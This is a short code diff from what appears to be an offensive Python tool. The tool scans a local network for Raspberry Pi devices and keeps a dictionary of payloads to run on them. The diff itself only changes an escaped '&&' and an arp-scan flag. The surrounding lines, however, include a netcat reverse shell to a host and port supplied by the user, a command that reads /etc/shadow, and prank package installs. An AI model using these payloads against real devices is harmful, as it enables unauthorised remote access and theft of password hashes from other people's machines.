@@ -41,7 +41,7 @@ args = parser.parse_args()
 
 payloads={
 'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fc',
-'apt_update':'sudo apt update && sudo apt -y upgrade',
+'apt_update':'sudo apt update \&\& sudo apt -y upgrade',
 'raincow_install':'sudo apt -y install fortune cowsay lolcat',
 'gitpip':'sudo apt -y install git python-pip',
 'shadow':'sudo cat /etc/shadow',
@@ -72,7 +72,7 @@ def list():
 
 def scan():
 	if not args.no_scan and not args.safe:
-		os.system('sudo arp-scan -g '+args.ip_range+' -w ./scan/scan.pcap'+quiet)
+		os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap'+quiet)
 		os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
 		os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
 		os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
